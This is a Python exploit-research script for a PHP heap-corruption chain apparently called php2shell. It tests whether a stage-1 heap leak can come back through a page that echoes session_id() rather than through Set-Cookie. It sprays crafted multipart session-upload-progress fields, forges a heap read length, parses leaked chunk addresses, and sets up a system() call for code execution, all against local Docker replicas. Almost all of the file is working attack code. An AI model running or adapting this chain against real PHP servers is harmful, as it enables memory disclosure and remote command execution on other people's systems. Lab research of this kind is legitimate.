#!/usr/bin/env python3
"""Test an alternative stage-1 leak channel: page-reflected session id.

On PHP 8.4.x the stage-1 heap leak reaches the client through the Set-Cookie
header, because the corrupted session-id string is what PHP puts in the
cookie. On PHP 8.1.x the same corruption happens (the session file is named
after the sprayed field value) but no Set-Cookie is emitted, so the leaked
bytes never leave the server.

The cookie is only one channel. Any application code that reflects the
session id -- session_id(), a debug page, an error message -- would carry the
same bytes. This script points the upstream chain at a page that echoes
session_id() and checks whether the forged 4096-byte heap dump comes back.

Local disposable containers only.
"""
from __future__ import annotations

import argparse
import os
import re
import struct
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402

LEAK_PAGE = "/leak.php"


def stage1_parts(mod, ex, n: int, forge_len: int, val_len: int = 48):
    """Upstream stage-1 request shape; returns the raw final response."""
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              ex._file_part(), ex._big_field()]
    ex.t.post(mod.build_multipart(parts, b"S" * 17), b"S" * 17,
              read_cap=1 << 20, timeout=90)
    time.sleep(0.2)

    parts = [{"name": "PHPSESSID", "data": mod.SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:val_len]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * forge_len)
    if forge_len >= 0x19:
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    return ex.t.post(mod.build_multipart(parts, b"B" * 10), b"B" * 10,
                     read_cap=9 << 20)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--image", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--name", required=True)
    ap.add_argument("--ns", default="841,900")
    ap.add_argument("--lens", default="48,63,79")
    args = ap.parse_args()

    M.docker("rm", "-f", args.name)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", args.name))
    M.docker(
        "run", "-d", "--name", args.name,
        "-p", f"127.0.0.1:{args.port}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{M.LAB}/php.ini:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
        "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
        "-v", f"{outdir}:/out",
        args.image, timeout=900,
    )
    url = f"http://127.0.0.1:{args.port}{LEAK_PAGE}"
    if not M.wait_http(url):
        raise SystemExit("replica did not answer")

    sym = C.extract_symbols(VENDOR, args.name)
    mod = C.load_upstream(VENDOR)
    t = mod.Target(url, verbose=False)
    ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                     dtor_offset=sym["zval_ptr_dtor"], profile="bookworm", verbose=False)

    print(f"[*] {args.image}  target {url}")
    for n in [int(x) for x in args.ns.split(",")]:
        for flen in [int(x) for x in args.lens.split(",")]:
            ex.rotate()
            resp = stage1_parts(mod, ex, n, flen)
            head, _, body = resp.partition(b"\r\n\r\n")
            cookie = C._cookie(resp)
            m = re.search(rb"SIDLEN=(\d+)\r?\nSID=(.*?)\r?\n", body, re.S)
            sid = m.group(2) if m else b""
            base = C.chunk_base(sid) if sid else 0
            marker = re.search(rb"v(\d{4})", sid)
            if not sid:
                print("    body:", body[:300].replace(b"\r", b"").replace(b"\n", b" | "))
            print(f"  N={n} len={flen}: cookie={len(cookie)}B sid={len(sid)}B "
                  f"marker={marker.group(1).decode() if marker else '-'} "
                  f"chunk={hex(base) if base else '-'}")
            if base:
                print(f"[+] HEAP LEAK via reflected session id: chunk={hex(base)}")
                print("    sid head:", sid[:120].hex())
                M.docker("rm", "-f", args.name)
                return 0
    print("[!] no leak through the reflected session id either")
    M.docker("rm", "-f", args.name)
    return 1


if __name__ == "__main__":
    sys.exit(main())
